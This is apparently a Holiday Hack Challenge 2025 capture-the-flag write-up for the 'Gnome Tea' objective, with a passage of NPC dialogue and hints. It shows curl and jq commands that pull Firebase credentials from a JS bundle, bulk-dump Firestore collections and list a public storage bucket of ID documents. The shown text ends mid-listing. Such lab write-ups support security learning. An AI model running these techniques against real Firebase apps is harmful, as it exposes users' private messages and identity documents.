<div class="kc-section kc-section--gnome-tea" style="margin-bottom: 0;">
  <h1 class="kc-section-title">Gnome Tea</h1>
  
  <!-- Difficulty + Location -->
  <div class="kc-objective-meta kc-objective-meta--stacked">
    <div class="kc-meta-line kc-difficulty">
      <span class="kc-meta-label">Difficulty:</span>
      <span class="kc-difficulty-scale"
            aria-label="Difficulty 1 out of 5 snowflakes">
        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
        <i class="fas fa-snowflake kc-snowflake"></i>
        <i class="fas fa-snowflake kc-snowflake"></i>
      </span>
    </div>

    <div class="kc-meta-line kc-location">
      <span class="kc-meta-label">Location:</span>
      <span class="kc-meta-value">Modern Scandinavian Condo (Apartment building near 24-7)</span>
    </div>
  </div>

  <!-- Objective line -->
  <p class="kc-objective-summary kc-meta-line">
    <span class="kc-meta-label">Objective:</span>
    <span class="kc-meta-value">
      Enter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.
    </span>
  </p>

  <!-- Conversation banner -->
  <div class="kc-convo-header">
    <span class="kc-convo-icon">
      <i class="fas fa-comment-dots" aria-hidden="true"></i>
    </span>
    <span class="kc-convo-title">Thomas Bouve Conversation:</span>
  </div>

  <div class="kc-objective-detail kc-objective-detail--no-panel">
    <div class="kc-convo-bubble">
      <div class="kc-convo-avatar">
        <img src="thomasbouve-avatar.gif"
             alt="Kevin McFarland avatar">
        <div class="kc-convo-name">Thomas Bouve</div>
      </div>

      <div class="kc-convo-text">
        <p>
          Hi there, I'm Thomas, but you can call me CraHan if you like.
        </p>
        <p>
          What do you mean 'weird accent'? I have no idea why people keep telling me that, but it sounds fine in my head, to be honest.
        </p>
        <p>
          Anyway, way back before I joined Counter Hack, I was an avid HHC player just like you!
          Some of <a class="kc-link-terminal" href="https://n00.be/" target="_blank" rel="noopener noreferrer">my write-ups</a>
          even resulted in a couple of wins throughout the years. Definitely check them out if you're looking for some inspiration.
        </p>
        <p>
          If you decide to submit your own report, my
          <a class="kc-link-terminal" href="https://github.com/crahan/HolidayHackChallengeTemplate" target="_blank" rel="noopener noreferrer">Holiday Hack Challenge report template</a>
          might help you save some time as well.
        </p>
        <p>
          My t-shirt? You like it? Well, Synthwave, cyberpunk, and even cassette futurism are definitely my kinda jam!
        </p>
        <p>
          I also love to tinker, but for some weird reason my drawer of unfinished hacking projects just keeps overflowing. 24 hours in a day simply isn't enough time, I guess.
        </p>
        <p>
          Oh... and no matter what Mark or Kevin try to tell you, the Amiga is the absolute best retro computing platform ever made!
        </p>
        <p>
          Hi again. Say, you wouldn't happen to have time to help me out with something?
        </p>
        <p>
          The gnomes have been oddly suspicious and whispering to each other. In fact, I could've sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said "passphrase denied". I asked what that was all about but it just giggled and ran away.
        </p>
        <p>
          I know they've been using
          <a class="kc-link-terminal" href="https://gnometea.web.app/login" target="_blank" rel="noopener noreferrer">GnomeTea</a>
          to "spill the tea" on one another, but I can't sign up 'cause I'm obviously not a gnome.
          I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is.
        </p>
        <p>
           I've tried a few things already, but as usual the whole... Uh, what's the word I'm looking for here? Oh right, "endeavor", ended up with the rest of my unfinished projects.
        </p>

        <div class="kc-convo-actions">
          <button class="kc-convo-play-btn" type="button"
                  data-npc-audio="gnome-tea">
            <i class="fas fa-play" aria-hidden="true"></i>
            <span>Play Audio</span>
          </button>
        </div>
      </div> <!-- /.kc-convo-text -->
    </div>   <!-- /.kc-convo-bubble -->
  </div>     <!-- /.kc-objective-detail -->

  <!-- Hints header -->
  <div class="kc-convo-header kc-hints-header">
    <span class="kc-convo-icon kc-hints-icon">
      <i class="fas fa-lightbulb" aria-hidden="true"></i>
    </span>
    <span class="kc-convo-title">Hints:</span>
  </div>

<!-- Hint 1 -->
<div class="kc-hint-card">
  <div class="kc-hint-title">License</div>
  <div class="kc-hint-meta">From: Santa</div>
  <div class="kc-hint-meta">Objective: Gnome Tea</div>
  <p>
    Exif jpeg image data can often contain data like the latitude and longitude of where the picture was taken.
  </p>
</div>

<!-- Hint 2 -->
<div class="kc-hint-card">
  <div class="kc-hint-title">GnomeTea</div>
  <div class="kc-hint-meta">From: Santa</div>
  <div class="kc-hint-meta">Objective: Gnome Tea</div>
  <p>
    I heard rumors that the new GnomeTea app is where all the Gnomes spill the tea on each other. It uses Firebase which means there is a client side config the app uses to connect to all the firebase services.
  </p>
</div>

<!-- Hint 3 -->
<div class="kc-hint-card">
  <div class="kc-hint-title">Statically Codede</div>
  <div class="kc-hint-meta">From: Santa</div>
  <div class="kc-hint-meta">Objective: Gnome Tea</div>
  <p>
    Hopefully they did not rely on hard-coded client-side controls to validate admin access once a user validly logs in. If so, it might be pretty easy to change some variable in the developer console to bypass these controls.
  </p>
</div>

<!-- Hint 4 -->
<div class="kc-hint-card">
  <div class="kc-hint-title">Rules</div>
  <div class="kc-hint-meta">From: Santa</div>
  <div class="kc-hint-meta">Objective: Gnome Tea</div>
  <p>
    Hopefully they setup their firestore and bucket security rules properly to prevent anyone from reading them easily with curl. There might be sensitive details leaked in messages.
  </p>
</div>

<!-- NEW purple banner goes *after* the bubble -->
<div class="kc-workflow-header">
<span class="kc-workflow-icon">
    <i class="fas fa-tasks" aria-hidden="true"></i>
</span>
<span class="kc-workflow-title">Working through the Challenge:</span>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>
  <div class="kc-workflow-row">
    <div class="kc-workflow-text">
      <p class="kc-workflow-intro">
        To get things started click on the Gnome Tea!
      </p>
    </div>

    <div class="kc-workflow-illustration">
      <img src="teaset.png"
          alt="Gnome Tea term"
          class="kc-workflow-image">
    </div>
  </div>
</div>

<div class="kc-ptas-screenshot">
  <div class="kc-ptas-image-wrapper">
    <img
      src="gnome-tea.png"
      alt="Gnome Tea - Spill the Tea! app"
      class="kc-ptas-thumb"
      data-full-src="gnome-tea.png"
    >

    <button
      class="kc-ptas-enlarge-btn"
      type="button"
      data-enlarge-target="gnome-tea.png"
    >
      <i class="fas fa-search-plus" aria-hidden="true"></i>
      Enlarge
    </button>
  </div>

  <div class="kc-ptas-caption">Gnome Tea ‚Äì Spill the Tea! web interface</div>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>
  <p>
    Lets investigate the page source and see if it holds any fruitful information.
  </p>
</div>

<div class="kc-code-window">
  <div class="kc-code-header">
    <i class="fas fa-code" aria-hidden="true"></i>
    <span>Page source (HTML)</span>
  </div>

  <pre class="kc-code-block"><code class="language-markup">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="UTF-8" /&gt;
    &lt;link rel="icon" type="image/png" href="/GnomeTeaLogoNoBg.png" /&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;
    &lt;!-- TODO: lock down dms, tea, gnomes collections --&gt;
    &lt;title&gt;GnomeTea - Spill the Tea!&lt;/title&gt;
    &lt;script type="module" crossorigin src="/assets/index-BVLyJWJ_.js"&gt;&lt;/script&gt;
    &lt;link rel="stylesheet" crossorigin href="/assets/index-C3GUVeby.css"&gt;
  &lt;/head&gt;
  &lt;body class="bg-gnome-cream"&gt;
    &lt;div id="root"&gt;&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>
  <p class="kc-workflow-intro">
    That <code>TODO</code> comment is a big hint ‚Äî and the app loads a minified JavaScript bundle.
    Next step: pull the bundle locally and grep it for Firebase config / initialization strings so we can
    spot backend services (project ID, storage bucket, auth domain, etc.).
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">BASE='https://gnometea.web.app'</span>
<span class="term-kali-command">curl -sS -o index.js "$BASE/assets/index-BVLyJWJ_.js"</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">grep -nE --color=always '<span class="term-red">apiKey</span>|<span class="term-red">projectId</span>|<span class="term-red">firebase</span>|<span class="term-red">initializeApp</span>|<span class="term-red">firebaseConfig</span>' index.js | head -n 80</span>

<span class="term-dim">------- Truncated Output -------------</span>
._requests.add(h),h.getPromise().then(()=>this._requests.delete(h),()=>this._requests.delete(h)),h}}async makeRequestWithTokens(e,t){const[s,o]=await Promise.all([this._getAuthToken(),this._getAppCheckToken()]);return this._makeRequest(e,t,s,o).getPromise()}}const fv="@<span class="term-red">firebase</span>/storage",pv="0.13.14";/**
<span class="term-green">3357</span>: */const Qw="storage";function kP(r=yf(),e){r=Wt(r);const s=Ec(r,Qw).getImmediate({identifier:e}),o=Ov("storage");return o&&xP(s,...o),s}function xP(r,e,t,s={}){CP(r,e,t,s)}function NP(r,{instanceIdentifier:e}){const t=r.getProvider("app").getImmediate(),s=r.getProvider("auth-internal"),o=r.getProvider("app-check-internal");return new PP(t,s,o,e,_s)}function DP(){ms(new Ii(Qw,NP,"PUBLIC").setMultipleInstances(!0)),tr(fv,pv,""),tr(fv,pv,"esm2017")}DP();const OP={<span class="term-line-focus">{<span class="term-red">apiKey</span>:"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",authDomain:"holidayhack2025.<span class="term-red">firebase</span>app.com",<span class="term-red">projectId</span>:"holidayhack2025",storageBucket:"holidayhack2025.</span><span class="term-red">firebase</span>storage.app",messagingSenderId:"341227752777",appId:"1:341227752777:web:7b9017d3d2d83ccf481e98"},lp=Uv(OP),Nd=oA(lp),er=BC(lp);kP(lp);const Yw=K.createContext({}),_l=()=>K.useContext(Yw),bP=({children:r})=>{const[e,t]=K.useState(null),[s,o]=K.useState(null),[l,h]=K.useState(!0);K.useEffect(()=>KS(Nd,async T=>{if(T){t(T);try{const I=await ap(Yf(er,"gnomes",T.uid));I.exists()&&o({id:I.id,...I.data()})}catch(I){console.error("Error fetching gnome profile:",I)}}else t(null),o(null);h(!
<span class="term-dim">------- Truncated Output -------------</span>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    With the <strong>Firebase projectId</strong> and <strong>API key</strong> recovered from the minified bundle,
    I tried a quick enumeration check against the Firestore REST API to see whether any collections were exposed
    without authentication.
  </p>

  <p class="kc-workflow-intro">
    Specifically, I called <code>documents:listCollectionIds</code> using the project + key we found. The response
    came back <strong>403 PERMISSION_DENIED</strong>, which tells us Firestore rules are enforcing authentication
    (and/or App Check) and we can‚Äôt enumerate collections anonymously just with the API key.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">export</span> <span class="term-kali-var">PROJECT</span>=<span class="term-kali-string">'holidayhack2025'</span>
<span class="term-kali-command">export</span> <span class="term-kali-var">APIKEY</span>=<span class="term-kali-string">'AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk'</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">curl</span> <span class="term-kali-flag">-sS</span> <span class="term-kali-flag">-X</span> <span class="term-kali-string">POST</span> \
  <span class="term-kali-string">"https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:listCollectionIds?key=$APIKEY"</span> \
  <span class="term-kali-flag">-H</span> <span class="term-kali-string">'Content-Type: application/json'</span> \
  <span class="term-kali-flag">-d</span> <span class="term-kali-string">'{"pageSize":100}'</span> <span class="term-kali-pipe">|</span> <span class="term-kali-command">jq</span>

<span class="term-kali-output term-kali-jq"><span class="term-jq-brace">{</span>
  <span class="term-jq-key">"error"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">{</span>
    <span class="term-jq-key">"code"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">403</span><span class="term-jq-punct">,</span>
    <span class="term-jq-key">"message"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Missing or insufficient permissions."</span><span class="term-jq-punct">,</span>
    <span class="term-jq-key">"status"</span><span class="term-jq-punct">:</span> <span class="term-jq-string term-kali-error">"PERMISSION_DENIED"</span>
  <span class="term-jq-brace">}</span>
<span class="term-jq-brace">}</span></span>

</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    The <code>listCollectionIds</code> endpoint returned <strong>PERMISSION_DENIED</strong>, but the HTML source included
    a very helpful TODO comment that effectively ‚Äúleaks‚Äù the likely collection names (<code>dms</code>, <code>tea</code>,
    <code>gnomes</code>).
  </p>

  <p class="kc-workflow-intro">
    Instead of enumerating collections, I switched to querying a known collection directly using Firestore‚Äôs
    <code>documents:runQuery</code> endpoint. If the security rules allow reads, this will return documents even when
    collection enumeration is blocked. I pulled a small sample (<code>limit: 5</code>) from <code>dms</code> to confirm access.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">curl</span> <span class="term-kali-flag">-sS</span> <span class="term-kali-flag">-X</span> <span class="term-kali-string">POST</span> \
  <span class="term-kali-string">"https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:runQuery?key=$APIKEY"</span> \
  <span class="term-kali-flag">-H</span> <span class="term-kali-string">'Content-Type: application/json'</span> \
  <span class="term-kali-flag">-d</span> <span class="term-kali-string">'{"structuredQuery":{"from":[{"collectionId":"dms"}],"limit":5}}'</span> <span class="term-kali-pipe">|</span> <span class="term-kali-command">jq</span>

<span class="term-kali-output term-kali-jq"><span class="term-jq-brace">[</span>
  <span class="term-jq-brace">{</span>
    <span class="term-jq-key">"document"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">{</span>
      <span class="term-jq-key">"name"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"projects/holidayhack2025/databases/(default)/documents/dms/1X3NYYPeZDOQrHAryFku"</span><span class="term-jq-punct">,</span>
      <span class="term-jq-key">"fields"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">{</span>
        <span class="term-jq-key">"participants"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">{</span>
          <span class="term-jq-key">"arrayValue"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">{</span>
            <span class="term-jq-key">"values"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">[</span>
              <span class="term-jq-brace">{</span> <span class="term-jq-key">"stringValue"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"golJeh7xg9YUvcj5nDugTssQPy62"</span> <span class="term-jq-brace">}</span><span class="term-jq-punct">,</span>
              <span class="term-jq-brace">{</span> <span class="term-jq-key">"stringValue"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"l7VS01K9GKV5ir5S8suDcwOFEpp2"</span> <span class="term-jq-brace">}</span>
            <span class="term-jq-brace">]</span>
          <span class="term-jq-brace">}</span>
        <span class="term-jq-brace">}</span><span class="term-jq-punct">,</span>

        <span class="term-jq-key">"participantNames"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">{</span>
          <span class="term-jq-key">"arrayValue"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">{</span>
            <span class="term-jq-key">"values"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">[</span>
              <span class="term-jq-brace">{</span> <span class="term-jq-key">"stringValue"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Grizelda Grit-Tooth"</span> <span class="term-jq-brace">}</span><span class="term-jq-punct">,</span>
              <span class="term-jq-brace">{</span> <span class="term-jq-key">"stringValue"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Barnaby Briefcase"</span> <span class="term-jq-brace">}</span>
            <span class="term-jq-brace">]</span>
          <span class="term-jq-brace">}</span>
        <span class="term-jq-brace">}</span>

        <span class="term-jq-string">---------- Truncated Output ----------------</span>
      <span class="term-jq-brace">}</span>


<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span></pre>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    Since <code>runQuery</code> allowed reads from <code>dms</code>, I used it to bulk-pull documents from all three
    collection names hinted by the TODO comment: <code>dms</code>, <code>tea</code>, and <code>gnomes</code>.
  </p>

  <p class="kc-workflow-intro">
    Each query requests up to <code>500</code> documents and then filters the response down to only the
    <code>.document</code> objects. I saved the results as JSONL (<em>one JSON document per line</em>) to make it easy
    to grep, jq, and parse later.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">curl</span> <span class="term-kali-flag">-sS</span> <span class="term-kali-flag">-X</span> <span class="term-kali-string">POST</span> \
  <span class="term-kali-string">"https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:runQuery?key=$APIKEY"</span> \
  <span class="term-kali-flag">-H</span> <span class="term-kali-string">'Content-Type: application/json'</span> \
  <span class="term-kali-flag">-d</span> <span class="term-kali-string">'{"structuredQuery":{"from":[{"collectionId":"dms"}],"limit":500}}'</span> \
  <span class="term-kali-pipe">|</span> <span class="term-kali-command">jq</span> <span class="term-kali-flag">-c</span> <span class="term-kali-string">'.[] | select(.document) | .document'</span> <span class="term-kali-redir">&gt;</span> <span class="term-kali-file">gnometea_dms.jsonl</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">curl</span> <span class="term-kali-flag">-sS</span> <span class="term-kali-flag">-X</span> <span class="term-kali-string">POST</span> \
  <span class="term-kali-string">"https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:runQuery?key=$APIKEY"</span> \
  <span class="term-kali-flag">-H</span> <span class="term-kali-string">'Content-Type: application/json'</span> \
  <span class="term-kali-flag">-d</span> <span class="term-kali-string">'{"structuredQuery":{"from":[{"collectionId":"tea"}],"limit":500}}'</span> \
  <span class="term-kali-pipe">|</span> <span class="term-kali-command">jq</span> <span class="term-kali-flag">-c</span> <span class="term-kali-string">'.[] | select(.document) | .document'</span> <span class="term-kali-redir">&gt;</span> <span class="term-kali-file">gnometea_tea.jsonl</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">curl</span> <span class="term-kali-flag">-sS</span> <span class="term-kali-flag">-X</span> <span class="term-kali-string">POST</span> \
  <span class="term-kali-string">"https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:runQuery?key=$APIKEY"</span> \
  <span class="term-kali-flag">-H</span> <span class="term-kali-string">'Content-Type: application/json'</span> \
  <span class="term-kali-flag">-d</span> <span class="term-kali-string">'{"structuredQuery":{"from":[{"collectionId":"gnomes"}],"limit":500}}'</span> \
  <span class="term-kali-pipe">|</span> <span class="term-kali-command">jq</span> <span class="term-kali-flag">-c</span> <span class="term-kali-string">'.[] | select(.document) | .document'</span> <span class="term-kali-redir">&gt;</span> <span class="term-kali-file">gnometea_gnomes.jsonl</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">ls</span> <span class="term-kali-flag">-als</span>
<span class="term-kali-output">total 908
  4 drwxr-xr-x 2 postshell postshell   4096 Dec 17 15:26 .
  4 drwxr-xr-x 7 postshell postshell   4096 Dec 17 12:06 ..
 88 -rw-r--r-- 1 postshell postshell  88879 Dec 17 15:42 gnometea_dms.jsonl
 24 -rw-r--r-- 1 postshell postshell  20694 Dec 17 15:45 gnometea_gnomes.jsonl
132 -rw-r--r-- 1 postshell postshell 132956 Dec 17 15:44 gnometea_tea.jsonl
656 -rw-r--r-- 1 postshell postshell 669808 Dec 17 12:59 index.js</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span></pre>
</div>

<div class="kc-note-bubble">
  <span class="kc-note-label">Write-up notes</span>

  <p class="kc-workflow-intro">
    While reviewing the downloaded JavaScript bundle, we also found the Firebase
    <strong>storageBucket</strong> value (<code>holidayhack2025.firebasestorage.app</code>). Since the application is
    clearly using Firebase Storage for user content, the next logical step was to test whether the Storage rules were
    also misconfigured.
  </p>

  <p class="kc-workflow-intro">
    Even though listing Firestore collections was blocked, direct reads from specific collections worked ‚Äî a pattern that
    often shows up alongside overly-permissive Firebase Storage rules. So I attempted to enumerate the bucket to see what
    objects are publicly listable.
  </p>
</div>

<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
  <div class="kali-titlebar">
    <span class="kali-titlebar-icon">üñ•Ô∏è</span>
    <span class="kali-title">Kali Shell</span>
    <span class="kali-titlebar-buttons">
      <span class="kali-btn kali-btn-min"></span>
      <span class="kali-btn kali-btn-max"></span>
      <span class="kali-btn kali-btn-close"></span>
    </span>
  </div>

  <pre class="kc-terminal-text"><span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-var">BUCKET</span><span class="term-kali-operator">=</span><span class="term-kali-string">'holidayhack2025.firebasestorage.app'</span>

<span class="term-kali-prompt">‚îå‚îÄ‚îÄ(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">„âø</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/gnometea]</span>
<span class="term-kali-prompt">‚îî‚îÄ$</span> <span class="term-kali-command">curl</span> <span class="term-kali-flag">-sS</span> <span class="term-kali-string">"https://firebasestorage.googleapis.com/v0/b/$BUCKET/o"</span> <span class="term-kali-pipe">|</span> <span class="term-kali-command">jq</span> <span class="term-kali-string">'.items[].name'</span> <span class="term-kali-pipe">|</span> <span class="term-kali-command">sed</span> <span class="term-kali-flag">-n</span> <span class="term-kali-string">'1,80p'</span>

<span class="term-kali-output term-kali-jq"><span class="term-jq-string">"gnome-avatars/6J2bowmKiNVbITWmR4XsxjH7i492_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/6nBUHcdxo2fLKSYqYyipr9iCOey2_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/7sQlw9l4xUOWSjDTphvLgKVEm0j1_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/G5c0vX06WOaEf1YKutqkur4HEU63_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/IvLFBZQgo3R6iteLHmShbWmctqo2_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/LA5w0EskgSbQyFnlp9OrX8Zovu43_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/LOPFa6rXj6eB7uMVHu6IbKARYbe2_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/PyxedrsAN2bewsg4Rno9SsCqZHg2_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/RQw0hYxlKIhsTUVPyR8ivrM3ls02_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/VgJCVlELJ6VfQTxeIt1dR5PWyiX2_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/golJeh7xg9YUvcj5nDugTssQPy62_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/jlm1nPFV5xWM4jQaokLHDb6K8kj1_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/kmoZyOIt7sWgehQC8ovcsxXPWUS2_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/l7VS01K9GKV5ir5S8suDcwOFEpp2_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/prxA2hBSkhg3dkhkfzvnlGxCCfP2_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/pwbhMFuRbkesddTrtT3gVRzv8Ux1_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/q6GasKLVBYSo3g4c1mI6qXDpRmv2_profile.png"</span>
<span class="term-jq-string">"gnome-avatars/xK25sJX7usSwAJwAjpN8DMfzS872_profile.png"</span>
<span class="term-jq-string">"gnome-documents/6J2bowmKiNVbITWmR4XsxjH7i492_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/6nBUHcdxo2fLKSYqYyipr9iCOey2_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/7sQlw9l4xUOWSjDTphvLgKVEm0j1_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/G5c0vX06WOaEf1YKutqkur4HEU63_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/IvLFBZQgo3R6iteLHmShbWmctqo2_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/LA5w0EskgSbQyFnlp9OrX8Zovu43_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/LOPFa6rXj6eB7uMVHu6IbKARYbe2_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/PyxedrsAN2bewsg4Rno9SsCqZHg2_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/RQw0hYxlKIhsTUVPyR8ivrM3ls02_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/VgJCVlELJ6VfQTxeIt1dR5PWyiX2_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/golJeh7xg9YUvcj5nDugTssQPy62_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/jlm1nPFV5xWM4jQaokLHDb6K8kj1_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/kmoZyOIt7sWgehQC8ovcsxXPWUS2_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg"</span>
<span class="term-jq-string">"gnome-documents/prxA2hBSkhg3dkhkfzvnlGxCCfP2_drivers_license.jpeg"</span>
